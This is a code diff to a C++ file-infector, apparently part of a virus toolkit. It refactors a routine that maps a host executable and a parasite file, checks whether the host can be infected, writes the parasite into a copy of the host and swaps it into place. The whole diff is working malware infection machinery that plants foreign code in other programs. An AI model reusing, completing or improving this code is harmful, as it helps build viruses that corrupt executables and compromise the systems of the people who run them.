@@ -12,6 +12,7 @@ namespace vt::infector {
 // pretend to be the host with atomic rename.
 template <typename Infect>
 bool infect(const char* host_path, const char* parasite_path) {
+  // host analysis phase, quick bailout if it cannot be infected.
   common::FileDescriptor host(host_path, O_RDONLY);
   if (!host.valid()) {
     return false;
@@ -20,12 +21,17 @@ bool infect(const char* host_path, const char* parasite_path) {
   common::Mmap<PROT_READ> host_mapping(host_size, MAP_SHARED, host.handle(), 0);
 
   common::FileDescriptor parasite(parasite_path, O_RDONLY);
-
   if (!parasite.valid()) {
     return false;
   }
   common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                            parasite.handle(), 0);
+
+  Infect infector;
+
+  if (!infector.analyze(host_mapping, parasite_mapping)) {
+    return false;
+  }
 
   char tmp[PATH_MAX];
   auto len = strlen(host_path);
@@ -38,18 +44,18 @@ bool infect(const char* host_path, const char* parasite_path) {
   if (!output.valid()) {
     return false;
   }
-  auto output_size = Infect::output_size(host_size, parasite_mapping.size());
-  vt::ftruncate(output.handle(), output_size);
+
+  vt::ftruncate(output.handle(), infector.injected_host_size());
 
   common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
-      output_size, MAP_SHARED, output.handle(), 0);
+      infector.injected_host_size(), MAP_SHARED, output.handle(), 0);
 
   // Make a writable copy of the host.
   vt::memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
              host_mapping.size());
 
-  Infect infector;
-  if (!infector(std::move(output_host_mapping), std::move(parasite_mapping))) {
+  if (!infector.infect(std::move(output_host_mapping),
+                       std::move(parasite_mapping))) {
     return false;
   }
 
